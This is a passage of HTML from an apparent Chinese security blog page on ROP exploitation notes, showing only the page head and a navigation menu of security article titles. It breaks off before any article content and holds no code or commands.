<!DOCTYPE html>
<html lang="zh-CN">

<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>

    
      <link rel="icon" href="/kanxi.jpg">
    

    <title>
        
          蒸米32位及64位ROP笔记 - Mi1k7ea
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="/css/spectre.min.css">
    <link rel="stylesheet" href="/css/spectre-exp.min.css">
    <link rel="stylesheet" href="/css/spectre-icons.min.css">

    <!-- Noto Sans TC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
    <!-- Noto Sans SC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
    <!-- Noto Sans -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">

    <!-- theme css & js -->
    <link rel="stylesheet" href="/css/book.css">
    <script src="/js/book.js"></script>

    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('img')
})
</script>

</head>

<body>

<div class="container">
  <div class="book-container">
    <div class="columns">
      <div class="column col-2 hide-lg">
        <div class="book-sidebar">
  <h4 class="site-meta">
    <a href="/">Mi1k7ea</a>
  </h4>
  <div class="sidebar-content">
    <p>Good Good Study</p>
<ul>
<li><a href="/archives"><strong>归档</strong></a></li>
</ul>
<hr>
<ul>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS<ul>
<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全<ul>
<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
</ul>

  </div>
</div>

<script src="/js/book-sidebar.js"></script>

<script>
collapse_sidebar(2)
highlight_tab()
show_sidebar()
</script>
      </div>

      <div class="column col-8 col-lg-12">
        <div class="book-content">
          <div class="book-navbar">
  <header class="navbar">
  <section class="navbar-section">
    <img class="navbar-icon" src="/kanxi.jpg">
  </section>
  <section class="navbar-center">
    Mi1k7ea
  </section>
  <section class="navbar-section">
    <label class="accordion-header c-hand" for="accordion-sidebar">
      <i class="icon icon-menu"></i>
    </label>
  </section>
</header>

<div class="accordion">
  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
  <div class="accordion-body">
    <p>Good Good Study</p>
<ul>
<li><a href="/archives"><strong>归档</strong></a></li>
</ul>
<hr>
<ul>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS<ul>
<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
